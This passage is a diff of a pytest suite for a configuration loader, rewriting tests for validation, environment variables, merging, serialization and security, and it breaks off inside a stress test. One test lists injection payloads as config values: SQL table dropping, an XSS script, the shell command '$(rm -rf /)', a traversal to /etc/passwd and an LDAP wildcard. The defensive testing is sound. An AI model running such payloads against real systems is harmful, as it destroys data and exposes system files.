@@ -788,1032 +788,1025 @@ class TestConfigPerformance:
         finally:
             os.unlink(temp_path)
 
+# Additional comprehensive tests for enhanced coverage
 class TestConfigAdvancedValidation:
-    """Advanced validation tests for configuration edge cases."""
+    """Advanced validation tests for configuration data."""
     
     def setup_method(self):
         """Set up test fixtures."""
         self.base_config = {
-            'api_key': 'test_key_123',
+            'api_key': 'test_api_key',
             'base_url': 'https://api.example.com',
             'timeout': 30,
             'max_retries': 3,
             'debug': False
         }
     
-    def test_config_with_special_characters_in_keys(self):
-        """Test configuration with special characters in keys."""
+    def test_config_error_messages_are_descriptive(self):
+        """Test that configuration error messages are descriptive and helpful."""
         if Config:
-            special_char_config = {
-                'api-key': 'test_key',
-                'base_url@domain': 'https://api.example.com',
-                'timeout#value': 30,
-                'max.retries': 3,
-                'debug_flag': False
+            test_cases = [
+                ({'api_key': None}, "api_key"),
+                ({'api_key': ''}, "api_key"),
+                ({'base_url': 'invalid-url'}, "base_url"),
+                ({'timeout': -1}, "timeout"),
+                ({'max_retries': 'not_a_number'}, "max_retries"),
+            ]
+            
+            for invalid_config, expected_field in test_cases:
+                test_config = {**self.base_config, **invalid_config}
+                with pytest.raises((ValueError, ConfigError)) as excinfo:
+                    Config(test_config)
+                
+                # Check that error message mentions the problematic field
+                error_msg = str(excinfo.value).lower()
+                assert expected_field.lower() in error_msg, f"Error message should mention '{expected_field}'"
+    
+    def test_config_validation_with_custom_validators(self):
+        """Test configuration validation with custom validation rules."""
+        if validate_config:
+            # Test email format validation if supported
+            test_configs = [
+                {'api_key': 'test', 'email': 'invalid-email', 'base_url': 'https://api.example.com'},
+                {'api_key': 'test', 'email': 'valid@example.com', 'base_url': 'https://api.example.com'},
+            ]
+            
+            for config in test_configs:
+                try:
+                    validate_config(config)
+                except (ValueError, ConfigError):
+                    # Expected for invalid formats
+                    pass
+    
+    def test_config_field_type_coercion(self):
+        """Test that configuration fields are properly type-coerced."""
+        if Config:
+            coercion_tests = [
+                ({'timeout': '30'}, int),      # String to int
+                ({'debug': 'true'}, bool),     # String to bool
+                ({'debug': '1'}, bool),        # String to bool
+                ({'max_retries': '5'}, int),   # String to int
+            ]
+            
+            for config_override, expected_type in coercion_tests:
+                test_config = {**self.base_config, **config_override}
+                try:
+                    config = Config(test_config)
+                    # Check if type coercion happened (implementation dependent)
+                    assert config is not None
+                except (ValueError, ConfigError, TypeError):
+                    # Some implementations may not support type coercion
+                    pass
+    
+    def test_config_schema_validation_comprehensive(self):
+        """Test comprehensive schema validation rules."""
+        if validate_config or Config:
+            invalid_schemas = [
+                # Invalid API key formats
+                {'api_key': 'x' * 1000, 'base_url': 'https://api.example.com'},
+                {'api_key': 'key with spaces', 'base_url': 'https://api.example.com'},
+                {'api_key': 'key\nwith\nnewlines', 'base_url': 'https://api.example.com'},
+                
+                # Invalid URL formats
+                {'api_key': 'test', 'base_url': 'http://localhost'},
+                {'api_key': 'test', 'base_url': 'https://'},
+                {'api_key': 'test', 'base_url': 'not-a-protocol://example.com'},
+                
+                # Invalid numeric ranges
+                {'api_key': 'test', 'timeout': 999999, 'base_url': 'https://api.example.com'},
+                {'api_key': 'test', 'max_retries': -999, 'base_url': 'https://api.example.com'},
+            ]
+            
+            for invalid_config in invalid_schemas:
+                with pytest.raises((ValueError, ConfigError, TypeError)):
+                    if validate_config:
+                        validate_config(invalid_config)
+                    elif Config:
+                        Config(invalid_config)
+
+
+class TestConfigEnvironmentIntegration:
+    """Enhanced tests for environment variable integration."""
+    
+    @patch.dict(os.environ, {
+        'CHARACTER_API_KEY': 'env_key',
+        'CHARACTER_BASE_URL': 'https://env.example.com',
+        'CHARACTER_DEBUG': 'true',
+        'CHARACTER_TIMEOUT': '60'
+    })
+    def test_config_environment_variable_precedence(self):
+        """Test that environment variables take precedence over config files."""
+        if Config:
+            file_config = {
+                'api_key': 'file_key',
+                'base_url': 'https://file.example.com',
+                'debug': False,
+                'timeout': 30
             }
             
-            try:
-                config = Config(special_char_config)
-                assert config is not None
-            except (ValueError, ConfigError, KeyError):
-                # Some implementations may not support special characters in keys
-                pass
+            # This test assumes the Config class checks environment variables
+            config = Config(file_config)
+            assert config is not None
     
-    def test_config_with_numeric_string_values(self):
-        """Test configuration with numeric values as strings."""
+    @patch.dict(os.environ, {'CHARACTER_INVALID_VAR': 'invalid_value'})
+    def test_config_handles_invalid_environment_variables(self):
+        """Test handling of invalid environment variable values."""
         if Config:
-            numeric_string_config = {
+            base_config = {
                 'api_key': 'test_key',
-                'base_url': 'https://api.example.com',
-                'timeout': '30',  # String instead of int
-                'max_retries': '3',  # String instead of int
-                'debug': 'false'  # String instead of boolean
-            }
-            
-            try:
-                config = Config(numeric_string_config)
-                assert config is not None
-                # Test if values are automatically converted
-                if hasattr(config, 'timeout'):
-                    assert isinstance(config.timeout, (int, str))
-            except (ValueError, ConfigError, TypeError):
-                # Some implementations may require strict typing
-                pass
-    
-    def test_config_with_null_values(self):
-        """Test configuration with null/None values."""
-        if Config:
-            null_config = {
-                'api_key': 'test_key',
-                'base_url': None,
-                'timeout': None,
-                'max_retries': None,
-                'debug': None
-            }
-            
-            with pytest.raises((ValueError, ConfigError, TypeError)):
-                Config(null_config)
-    
-    def test_config_with_mixed_case_keys(self):
-        """Test configuration with mixed case keys."""
-        if Config:
-            mixed_case_config = {
-                'API_KEY': 'test_key',
-                'Base_URL': 'https://api.example.com',
-                'TimeOut': 30,
-                'maxRetries': 3,
-                'DEBUG': False
-            }
-            
-            try:
-                config = Config(mixed_case_config)
-                assert config is not None
-            except (ValueError, ConfigError, KeyError):
-                # Key case sensitivity may vary by implementation
-                pass
-    
-    def test_config_with_duplicate_keys_different_case(self):
-        """Test configuration behavior with duplicate keys in different cases."""
-        if Config:
-            # This test is more about understanding behavior than expecting specific results
-            duplicate_case_config = {
-                'api_key': 'lowercase_key',
-                'API_KEY': 'uppercase_key',
-                'Api_Key': 'mixed_case_key',
                 'base_url': 'https://api.example.com'
             }
             
+            # Should handle invalid env vars gracefully
             try:
-                config = Config(duplicate_case_config)
-                # Behavior may vary - last key wins, error, or merge
+                config = Config(base_config)
                 assert config is not None
             except (ValueError, ConfigError):
-                # Some implementations may detect key conflicts
+                # Expected if strict env var validation is implemented
                 pass
     
-    def test_config_with_boolean_string_variations(self):
-        """Test configuration with various boolean string representations."""
-        if Config:
-            boolean_variations = [
-                ('true', True), ('false', False), ('True', True), ('False', False),
-                ('TRUE', True), ('FALSE', False), ('yes', True), ('no', False),
-                ('1', True), ('0', False), ('on', True), ('off', False)
-            ]
-            
-            for bool_str, expected in boolean_variations:
-                test_config = {
-                    'api_key': 'test_key',
-                    'base_url': 'https://api.example.com',
-                    'debug': bool_str
-                }
-                
-                try:
-                    config = Config(test_config)
-                    assert config is not None
-                    # Test if boolean conversion works as expected
-                    if hasattr(config, 'debug'):
-                        debug_val = config.debug
-                        # Value should be converted to boolean or remain as string
-                        assert isinstance(debug_val, (bool, str))
-                except (ValueError, ConfigError, TypeError):
-                    # Some boolean string formats may not be supported
-                    pass
-    
-    def test_config_with_array_values(self):
-        """Test configuration with array/list values."""
-        if Config:
-            array_config = {
-                'api_key': 'test_key',
-                'base_url': 'https://api.example.com',
-                'allowed_methods': ['GET', 'POST', 'PUT', 'DELETE'],
-                'supported_formats': ['json', 'xml', 'yaml'],
-                'retry_codes': [500, 502, 503, 504],
-                'feature_flags': [True, False, True]
-            }
-            
-            config = Config(array_config)
-            assert config is not None
-    
-    def test_config_with_empty_arrays(self):
-        """Test configuration with empty array values."""
-        if Config:
-            empty_array_config = {
-                'api_key': 'test_key',
-                'base_url': 'https://api.example.com',
-                'allowed_methods': [],
-                'supported_formats': [],
-                'retry_codes': []
-            }
-            
-            config = Config(empty_array_config)
-            assert config is not None
-    
-    def test_config_with_numeric_edge_values(self):
-        """Test configuration with numeric edge case values."""
-        if Config:
-            import sys
-            
-            numeric_edge_cases = [
-                ('timeout', sys.maxsize),
-                ('timeout', -sys.maxsize),
-                ('max_retries', 0),
-                ('max_retries', 1000000),
-                ('port', 65535),
-                ('port', 1),
-                ('weight', 0.0),
-                ('weight', 1.0),
-                ('ratio', -1.0)
-            ]
-            
-            for field, value in numeric_edge_cases:
-                test_config = {
-                    'api_key': 'test_key',
-                    'base_url': 'https://api.example.com',
-                    field: value
-                }
-                
-                try:
-                    config = Config(test_config)
-                    assert config is not None
-                except (ValueError, ConfigError, OverflowError):
-                    # Some extreme values may be rejected
-                    pass
-
-
-class TestConfigErrorMessages:
-    """Test detailed error messages and error handling."""
-    
-    def test_config_validation_error_messages(self):
-        """Test that validation errors contain helpful messages."""
-        if validate_config:
-            invalid_configs = [
-                ({}, "empty configuration"),
-                ({'api_key': ''}, "empty API key"),
-                ({'api_key': 'test', 'timeout': -1}, "negative timeout"),
-                ({'api_key': 'test', 'base_url': 'invalid_url'}, "invalid URL")
-            ]
-            
-            for invalid_config, description in invalid_configs:
-                try:
-                    validate_config(invalid_config)
-                    pytest.fail(f"Should have failed for {description}")
-                except (ValueError, ConfigError) as e:
-                    # Error message should be informative
-                    error_msg = str(e).lower()
-                    assert len(error_msg) > 0
-                    # Could check for specific error message content
-    
-    def test_config_creation_error_context(self):
-        """Test that config creation errors provide context."""
-        if Config:
-            with pytest.raises((ValueError, ConfigError)) as exc_info:
-                Config({'api_key': None})
-            
-            error_msg = str(exc_info.value)
-            assert len(error_msg) > 0
-            # Error should mention the problematic field
-    
-    def test_config_file_loading_error_details(self):
-        """Test detailed error messages for file loading failures."""
-        if load_config:
-            # Test with non-existent file
-            try:
-                load_config('/path/does/not/exist.json')
-            except (FileNotFoundError, ConfigError, IOError) as e:
-                error_msg = str(e)
-                assert 'exist' in error_msg.lower() or 'found' in error_msg.lower()
-            
-            # Test with invalid JSON
-            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
-                f.write('{ invalid json }')
-                temp_path = f.name
-            
-            try:
-                try:
-                    load_config(temp_path)
-                except (json.JSONDecodeError, ConfigError, ValueError) as e:
-                    error_msg = str(e)
-                    assert len(error_msg) > 0
-                    # Should indicate JSON parsing issue
-            finally:
-                os.unlink(temp_path)
-
-
-class TestConfigMemoryManagement:
-    """Test memory management and resource cleanup."""
-    
-    def test_config_memory_usage(self):
-        """Test that config objects don't consume excessive memory."""
-        if Config:
-            import gc
-            import sys
-            
-            # Create many config objects
-            configs = []
-            for i in range(1000):
-                config_data = {
-                    'api_key': f'test_key_{i}',
-                    'base_url': f'https://api{i}.example.com',
-                    'timeout': 30 + i,
-                    'max_retries': 3,
-                    'debug': i % 2 == 0
-                }
-                configs.append(Config(config_data))
-            
-            # Force garbage collection
-            gc.collect()
-            
-            # Memory usage should be reasonable
-            # This is more of a smoke test than a strict assertion
-            assert len(configs) == 1000
-            
-            # Clean up
-            del configs
-            gc.collect()
-    
-    def test_config_object_lifecycle(self):
-        """Test config object creation and destruction."""
-        if Config:
-            import weakref
-            
-            config_data = {'api_key': 'test_key'}
-            config = Config(config_data)
-            
-            # Create weak reference to track object lifecycle
-            weak_ref = weakref.ref(config)
-            assert weak_ref() is not None
-            
-            # Delete the config object
-            del config
-            
-            # Force garbage collection
-            import gc
-            gc.collect()
-            
-            # Object should be garbage collected (implementation dependent)
-            # This is informational rather than strictly enforced
-
-
-class TestConfigCompatibility:
-    """Test compatibility across different scenarios."""
-    
-    def test_config_python_version_compatibility(self):
-        """Test config behavior across Python version differences."""
-        if Config:
-            import sys
-            
-            # Test dictionary ordering (Python 3.7+ guarantees order)
-            config_data = {
-                'z_key': 'last',
-                'a_key': 'first',
-                'm_key': 'middle'
-            }
-            
-            config = Config(config_data)
-            assert config is not None
-            
-            # Test that config works regardless of insertion order
-    
-    def test_config_with_pathlib_paths(self):
-        """Test config with pathlib.Path objects."""
-        if load_config:
-            from pathlib import Path
-            
-            # Create temp file
-            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
-                json.dump({'api_key': 'pathlib_test'}, f)
-                temp_path = f.name
-            
-            try:
-                # Test with pathlib.Path object
-                path_obj = Path(temp_path)
-                config = load_config(path_obj)
+    def test_config_environment_variable_type_conversion(self):
+        """Test proper type conversion of environment variables."""
+        with patch.dict(os.environ, {
+            'CHARACTER_TIMEOUT': '45',
+            'CHARACTER_DEBUG': 'false',
+            'CHARACTER_MAX_RETRIES': '7'
+        }):
+            if Config:
+                config = Config({'api_key': 'test', 'base_url': 'https://api.example.com'})
                 assert config is not None
-                assert config.get('api_key') == 'pathlib_test'
-            except TypeError:
-                # Some implementations may not support pathlib.Path
+
+
+class TestConfigMerging:
+    """Tests for configuration merging and precedence."""
+    
+    def test_config_merge_multiple_sources(self):
+        """Test merging configuration from multiple sources."""
+        if Config:
+            default_config = {
+                'api_key': 'default_key',
+                'base_url': 'https://default.example.com',
+                'timeout': 30,
+                'debug': False
+            }
+            
+            user_config = {
+                'api_key': 'user_key',
+                'timeout': 60,
+                'custom_field': 'user_value'
+            }
+            
+            # Test merging behavior (implementation dependent)
+            try:
+                merged_config = Config({**default_config, **user_config})
+                assert merged_config is not None
+            except (ValueError, ConfigError):
+                # Expected if merging is not supported
                 pass
-            finally:
-                os.unlink(temp_path)
     
-    def test_config_with_bytes_values(self):
-        """Test config behavior with bytes values."""
+    def test_config_nested_merge_behavior(self):
+        """Test merging behavior for nested configuration objects."""
         if Config:
-            bytes_config = {
-                'api_key': b'test_key_bytes',
-                'base_url': 'https://api.example.com'
+            base_config = {
+                'api_key': 'test',
+                'settings': {
+                    'cache': {'enabled': True, 'ttl': 300},
+                    'logging': {'level': 'INFO'}
+                }
+            }
+            
+            override_config = {
+                'api_key': 'test',
+                'settings': {
+                    'cache': {'ttl': 600},
+                    'debug': {'enabled': True}
+                }
             }
             
             try:
-                config = Config(bytes_config)
+                config = Config({**base_config, **override_config})
                 assert config is not None
-            except (ValueError, ConfigError, TypeError):
-                # Bytes values may not be supported
+            except (ValueError, ConfigError):
+                # Expected if nested merging is not supported
                 pass
-
-
-class TestConfigLogging:
-    """Test configuration logging and debugging features."""
-    
-    def test_config_debug_logging(self):
-        """Test config debug logging when enabled."""
-        if Config:
-            import logging
-            from unittest.mock import patch
-            
-            debug_config = {
-                'api_key': 'test_key',
-                'base_url': 'https://api.example.com',
-                'debug': True
-            }
-            
-            with patch('logging.Logger.debug') as mock_debug:
-                config = Config(debug_config)
-                assert config is not None
-                # Debug logging may or may not have been called
-                # This is more of a smoke test
-    
-    def test_config_warning_for_deprecated_fields(self):
-        """Test warnings for deprecated configuration fields."""
-        if Config:
-            import warnings
-            
-            deprecated_config = {
-                'api_key': 'test_key',
-                'base_url': 'https://api.example.com',
-                'old_field': 'deprecated_value',  # Potentially deprecated
-                'legacy_setting': True
-            }
-            
-            with warnings.catch_warnings(record=True) as w:
-                warnings.simplefilter("always")
-                config = Config(deprecated_config)
-                assert config is not None
-                # Warnings may or may not be issued depending on implementation
 
 
 class TestConfigSerialization:
-    """Test configuration serialization and deserialization."""
+    """Enhanced tests for configuration serialization."""
     
     def test_config_to_dict_conversion(self):
-        """Test converting config objects back to dictionaries."""
+        """Test converting configuration objects to dictionaries."""
         if Config:
-            original_data = {
+            config_data = {
+                'api_key': 'test_key',
+                'base_url': 'https://api.example.com',
+                'timeout': 30
+            }
+            
+            config = Config(config_data)
+            
+            # Test various ways to convert to dict
+            try:
+                if hasattr(config, 'to_dict'):
+                    dict_repr = config.to_dict()
+                    assert isinstance(dict_repr, dict)
+                    assert dict_repr['api_key'] == 'test_key'
+                elif hasattr(config, '__dict__'):
+                    dict_repr = config.__dict__
+                    assert isinstance(dict_repr, dict)
+                elif hasattr(config, 'items'):
+                    dict_repr = dict(config.items())
+                    assert isinstance(dict_repr, dict)
+            except (AttributeError, TypeError):
+                # Expected if serialization is not supported
+                pass
+    
+    def test_config_json_serialization(self):
+        """Test JSON serialization of configuration objects."""
+        if Config:
+            config_data = {
                 'api_key': 'test_key',
                 'base_url': 'https://api.example.com',
                 'timeout': 30,
                 'debug': False
             }
             
-            config = Config(original_data)
+            config = Config(config_data)
             
-            # Try different ways to convert back to dict
             try:
-                if hasattr(config, 'to_dict'):
-                    result_dict = config.to_dict()
-                    assert isinstance(result_dict, dict)
-                    assert 'api_key' in result_dict
-                elif hasattr(config, '__dict__'):
-                    result_dict = config.__dict__
-                    assert isinstance(result_dict, dict)
+                if hasattr(config, 'to_json'):
+                    json_str = config.to_json()
+                    assert isinstance(json_str, str)
+                    # Should be valid JSON
+                    json.loads(json_str)
                 else:
-                    # Try to iterate over config as dict-like object
-                    result_dict = dict(config)
-                    assert isinstance(result_dict, dict)
-            except (AttributeError, TypeError):
-                # Serialization methods may not be implemented
+                    # Try to serialize using vars() or similar
+                    json_str = json.dumps(vars(config))
+                    assert isinstance(json_str, str)
+            except (AttributeError, TypeError, json.JSONEncodeError):
+                # Expected if JSON serialization is not supported
                 pass
     
-    def test_config_json_serialization(self):
-        """Test JSON serialization of config objects."""
+    def test_config_yaml_serialization(self):
+        """Test YAML serialization of configuration objects."""
         if Config:
-            original_data = {
+            config_data = {
                 'api_key': 'test_key',
                 'base_url': 'https://api.example.com',
                 'timeout': 30
             }
             
-            config = Config(original_data)
+            config = Config(config_data)
             
             try:
-                # Test if config can be JSON serialized
-                json_str = json.dumps(config, default=str)
-                assert isinstance(json_str, str)
-                assert len(json_str) > 0
-            except (TypeError, ValueError):
-                # Direct JSON serialization may not be supported
-                pass
-    
-    def test_config_copy_behavior(self):
-        """Test config object copying behavior."""
-        if Config:
-            import copy
-            
-            original_data = {
-                'api_key': 'test_key',
-                'nested': {'value': 'test'}
-            }
-            
-            config = Config(original_data)
-            
-            try:
-                # Test shallow copy
-                shallow_copy = copy.copy(config)
-                assert shallow_copy is not None
-                assert shallow_copy is not config
-                
-                # Test deep copy
-                deep_copy = copy.deepcopy(config)
-                assert deep_copy is not None
-                assert deep_copy is not config
-            except (TypeError, AttributeError):
-                # Copying may not be supported for all config implementations
+                if hasattr(config, 'to_yaml'):
+                    yaml_str = config.to_yaml()
+                    assert isinstance(yaml_str, str)
+                    # Should be valid YAML
+                    yaml.safe_load(yaml_str)
+                else:
+                    # Try to serialize using vars() or similar
+                    yaml_str = yaml.dump(vars(config))
+                    assert isinstance(yaml_str, str)
+            except (AttributeError, TypeError, yaml.YAMLError):
+                # Expected if YAML serialization is not supported
                 pass
 
 
-class TestConfigNetworking:
-    """Test configuration for network-related settings."""
+class TestConfigAdvancedSecurity:
+    """Advanced security tests for configuration handling."""
     
-    def test_config_url_variations(self):
-        """Test various URL formats and protocols."""
-        if Config:
-            url_variations = [
-                'https://api.example.com',
-                'http://localhost:8080',
-                'https://api.example.com:443/v1',
-                'http://127.0.0.1:3000/api',
-                'https://subdomain.api.example.com/v2/endpoint'
+    def test_config_injection_attacks(self):
+        """Test protection against various injection attacks."""
+        if Config or validate_config:
+            injection_payloads = [
+                # SQL injection attempts
+                {'api_key': "'; DROP TABLE users; --", 'base_url': 'https://api.example.com'},
+                # Script injection attempts
+                {'api_key': '<script>alert("xss")</script>', 'base_url': 'https://api.example.com'},
+                # Command injection attempts
+                {'api_key': '$(rm -rf /)', 'base_url': 'https://api.example.com'},
+                # Path traversal attempts
+                {'api_key': '../../../etc/passwd', 'base_url': 'https://api.example.com'},
+                # LDAP injection attempts
+                {'api_key': '*)(uid=*', 'base_url': 'https://api.example.com'},
             ]
             
-            for url in url_variations:
-                config_data = {
-                    'api_key': 'test_key',
-                    'base_url': url
-                }
-                
+            for payload in injection_payloads:
                 try:
-                    config = Config(config_data)
-                    assert config is not None
+                    if validate_config:
+                        validate_config(payload)
+                    elif Config:
+                        Config(payload)
+                    # If no exception, the payload was accepted (might be okay)
                 except (ValueError, ConfigError):
-                    # Some URL formats may be rejected
+                    # Expected for rejected payloads
                     pass
     
-    def test_config_port_ranges(self):
-        """Test configuration with various port numbers."""
+    def test_config_sensitive_data_masking(self):
+        """Test that sensitive data is properly masked in logs and string representations."""
         if Config:
-            port_test_cases = [
-                (80, True),    # Standard HTTP
-                (443, True),   # Standard HTTPS  
-                (8080, True),  # Common alternative
-                (3000, True),  # Development port
-                (65535, True), # Maximum port
-                (0, False),    # Invalid port
-                (-1, False),   # Invalid port
-                (65536, False) # Above maximum
+            sensitive_config = {
+                'api_key': 'very_secret_key_12345',
+                'password': 'super_secret_password',
+                'token': 'auth_token_xyz789',
+                'secret': 'my_secret_value',
+                'base_url': 'https://api.example.com'
+            }
+            
+            config = Config(sensitive_config)
+            
+            # Test string representation masking
+            str_repr = str(config)
+            repr_repr = repr(config)
+            
+            sensitive_values = ['very_secret_key_12345', 'super_secret_password', 'auth_token_xyz789', 'my_secret_value']
+            for sensitive_value in sensitive_values:
+                assert sensitive_value not in str_repr, f"Sensitive value '{sensitive_value}' found in str() representation"
+                assert sensitive_value not in repr_repr, f"Sensitive value '{sensitive_value}' found in repr() representation"
+    
+    def test_config_secure_comparison(self):
+        """Test that configuration comparison is secure against timing attacks."""
+        if Config:
+            config1 = Config({'api_key': 'secret_key_1', 'base_url': 'https://api.example.com'})
+            config2 = Config({'api_key': 'secret_key_2', 'base_url': 'https://api.example.com'})
+            
+            # Test equality comparison
+            try:
+                result = config1 == config2
+                assert isinstance(result, bool)
+            except (TypeError, AttributeError):
+                # Expected if comparison is not implemented
+                pass
+
+
+class TestConfigReloadAndUpdate:
+    """Tests for configuration reloading and updating functionality."""
+    
+    def test_config_reload_from_file(self):
+        """Test reloading configuration from file after changes."""
+        if load_config:
+            # Create initial config file
+            initial_config = {'api_key': 'initial_key', 'base_url': 'https://initial.example.com'}
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+                json.dump(initial_config, f)
+                temp_path = f.name
+            
+            try:
+                # Load initial config
+                config1 = load_config(temp_path)
+                assert config1.get('api_key') == 'initial_key'
+                
+                # Update file
+                updated_config = {'api_key': 'updated_key', 'base_url': 'https://updated.example.com'}
+                with open(temp_path, 'w') as f:
+                    json.dump(updated_config, f)
+                
+                # Reload config
+                config2 = load_config(temp_path)
+                assert config2.get('api_key') == 'updated_key'
+                
+            finally:
+                os.unlink(temp_path)
+    
+    def test_config_update_in_place(self):
+        """Test updating configuration object in place."""
+        if Config:
+            initial_config = {'api_key': 'initial_key', 'base_url': 'https://api.example.com'}
+            config = Config(initial_config)
+            
+            # Test if config supports updating
+            try:
+                if hasattr(config, 'update'):
+                    config.update({'api_key': 'updated_key'})
+                elif hasattr(config, 'set'):
+                    config.set('api_key', 'updated_key')
+                # If no update methods, config is likely immutable (which is fine)
+            except (AttributeError, TypeError):
+                # Expected for immutable configs
+                pass
+
+
+class TestConfigCrossPlatform:
+    """Cross-platform compatibility tests."""
+    
+    def test_config_path_handling_cross_platform(self):
+        """Test that configuration handles file paths correctly across platforms."""
+        if load_config:
+            # Test various path formats
+            test_paths = [
+                'config.json',                    # Relative path
+                './config.json',                  # Explicit relative path
+                os.path.abspath('config.json'),   # Absolute path
             ]
             
-            for port, should_be_valid in port_test_cases:
-                config_data = {
-                    'api_key': 'test_key',
-                    'base_url': 'https://api.example.com',
-                    'port': port
-                }
+            for path_format in test_paths:
+                # Create config file at the test path
+                config_data = {'api_key': 'test_key'}
+                dir_path = os.path.dirname(path_format) or '.'
+                os.makedirs(dir_path, exist_ok=True)
                 
-                if should_be_valid:
-                    try:
-                        config = Config(config_data)
-                        assert config is not None
-                    except (ValueError, ConfigError):
-                        # Some valid ports might still be rejected by specific implementations
-                        pass
-                else:
-                    with pytest.raises((ValueError, ConfigError)):
-                        Config(config_data)
+                try:
+                    with open(path_format, 'w') as f:
+                        json.dump(config_data, f)
+                    
+                    config = load_config(path_format)
+                    assert config is not None
+                    assert config.get('api_key') == 'test_key'
+                    
+                finally:
+                    if os.path.exists(path_format):
+                        os.unlink(path_format)
+    
+    def test_config_encoding_handling(self):
+        """Test that configuration handles various text encodings correctly."""
+        if load_config:
+            # Test different encodings
+            encodings = ['utf-8', 'utf-16', 'latin-1']
+            
+            for encoding in encodings:
+                config_data = {'api_key': 'test_key_ñ_中文', 'base_url': 'https://api.example.com'}
+                
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.json', encoding=encoding, delete=False) as f:
+                    json.dump(config_data, f, ensure_ascii=False)
+                    temp_path = f.name
+                
+                try:
+                    config = load_config(temp_path)
+                    assert config is not None
+                    assert 'test_key_ñ_中文' in str(config.get('api_key', ''))
+                except (UnicodeDecodeError, UnicodeEncodeError):
+                    # Expected for unsupported encodings
+                    pass
+                finally:
+                    os.unlink(temp_path)
 
 
-# Additional parametrized tests for comprehensive coverage
-@pytest.mark.parametrize("field,value,expected_valid", [
-    ("timeout", 1, True),
-    ("timeout", 30, True),
-    ("timeout", 300, True),
-    ("timeout", 0, False),
-    ("timeout", -1, False),
-    ("max_retries", 0, True),
-    ("max_retries", 1, True),
-    ("max_retries", 10, True),
-    ("max_retries", -1, False),
-    ("debug", True, True),
-    ("debug", False, True),
-    ("debug", 1, False),
-    ("debug", "true", False),
-])
-def test_config_field_validation_comprehensive(field, value, expected_valid):
-    """Comprehensive field validation test."""
+class TestConfigAdvancedErrorHandling:
+    """Advanced error handling and recovery tests."""
+    
+    def test_config_graceful_degradation(self):
+        """Test graceful degradation when partial configuration is available."""
+        if Config:
+            partial_configs = [
+                {'api_key': 'test_key'},  # Minimal config
+                {'api_key': 'test_key', 'base_url': 'https://api.example.com'},  # Partial config
+            ]
+            
+            for partial_config in partial_configs:
+                try:
+                    config = Config(partial_config)
+                    assert config is not None
+                    # Should either work with defaults or raise clear error
+                except (ValueError, ConfigError) as e:
+                    # Should have clear error message about missing fields
+                    assert len(str(e)) > 0
+    
+    def test_config_error_recovery_strategies(self):
+        """Test various error recovery strategies."""
+        if load_config:
+            # Test recovery from corrupted files
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+                f.write('{"api_key": "test", "corrupted": }')  # Invalid JSON
+                temp_path = f.name
+            
+            try:
+                with pytest.raises((json.JSONDecodeError, ConfigError, ValueError)):
+                    load_config(temp_path)
+            finally:
+                os.unlink(temp_path)
+    
+    def test_config_validation_detailed_errors(self):
+        """Test that validation errors provide detailed information."""
+        if validate_config:
+            invalid_config = {
+                'api_key': '',  # Empty
+                'base_url': 'invalid-url',  # Invalid URL
+                'timeout': -1,  # Invalid timeout
+                'max_retries': 'not_a_number'  # Invalid type
+            }
+            
+            try:
+                validate_config(invalid_config)
+                pytest.fail("Expected validation to fail")
+            except (ValueError, ConfigError) as e:
+                error_msg = str(e)
+                # Error message should mention specific issues
+                assert len(error_msg) > 20  # Should be descriptive
+                # Could check for specific fields mentioned in error
+
+
+@pytest.mark.parametrize("config_size", [1, 10, 100, 1000])
+def test_config_performance_with_varying_sizes(config_size):
+    """Test configuration performance with varying configuration sizes."""
     if not Config:
         pytest.skip("Config class not available")
     
-    config_data = {
+    import time
+    
+    # Generate config of specified size
+    large_config = {
         'api_key': 'test_key',
-        'base_url': 'https://api.example.com',
-        field: value
-    }
-    
-    if expected_valid:
-        try:
-            config = Config(config_data)
-            assert config is not None
-        except (ValueError, ConfigError):
-            pytest.fail(f"Valid {field}={value} was rejected")
-    else:
-        with pytest.raises((ValueError, ConfigError, TypeError)):
-            Config(config_data)
-
-
-@pytest.mark.parametrize("api_key_length", [1, 10, 32, 64, 128, 256, 512, 1024])
-def test_config_api_key_lengths(api_key_length):
-    """Test configuration with various API key lengths."""
-    if not Config:
-        pytest.skip("Config class not available")
-    
-    api_key = 'x' * api_key_length
-    config_data = {
-        'api_key': api_key,
         'base_url': 'https://api.example.com'
     }
     
-    try:
-        config = Config(config_data)
-        assert config is not None
-        if hasattr(config, 'api_key'):
-            assert len(config.api_key) == api_key_length
-    except (ValueError, ConfigError):
-        # Some key lengths may be rejected
-        pass
+    # Add many configuration items
+    for i in range(config_size):
+        large_config[f'setting_{i}'] = f'value_{i}'
+    
+    # Measure creation time
+    start_time = time.time()
+    config = Config(large_config)
+    creation_time = time.time() - start_time
+    
+    # Should handle larger configs efficiently
+    max_time = 0.001 * config_size  # Linear time complexity assumption
+    assert creation_time < max_time, f"Config creation too slow for size {config_size}: {creation_time:.4f}s"
 
 
-@pytest.mark.parametrize("encoding", ["utf-8", "ascii", "latin-1"])
-def test_config_file_encodings(encoding):
-    """Test configuration file loading with different encodings."""
+@pytest.mark.parametrize("file_format,extension", [
+    ("json", ".json"),
+    ("yaml", ".yaml"),
+    ("yaml", ".yml"),
+])
+def test_config_file_format_detection(file_format, extension):
+    """Test automatic file format detection based on extension."""
     if not load_config:
         pytest.skip("load_config function not available")
     
-    config_data = {'api_key': 'test_key_éñ'}  # Include non-ASCII characters
+    config_data = {'api_key': 'format_detection_test'}
+    
+    with tempfile.NamedTemporaryFile(mode='w', suffix=extension, delete=False) as f:
+        if file_format == 'json':
+            json.dump(config_data, f)
+        elif file_format == 'yaml':
+            yaml.dump(config_data, f)
+        temp_path = f.name
     
     try:
-        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False, encoding=encoding) as f:
-            json.dump(config_data, f, ensure_ascii=False)
-            temp_path = f.name
+        config = load_config(temp_path)
+        assert config is not None
+        assert config.get('api_key') == 'format_detection_test'
+    finally:
+        os.unlink(temp_path)
+
+
+# Stress tests for robustness
+class TestConfigStress:
+    """Stress tests for configuration handling under extreme conditions."""
+    
+    def test_config_memory_usage_with_large_configs(self):
+        """Test memory usage doesn't grow excessively with large configurations."""
+        if not Config:
+            pytest.skip("Config class not available")
         
-        try:
-            config = load_config(temp_path)
+        import gc
+        import sys
+        
+        # Create very large config
+        large_config = {
+            'api_key': 'test_key',
+            'base_url': 'https://api.example.com'
+        }
+        
+        # Add 10000 settings
+        for i in range(10000):
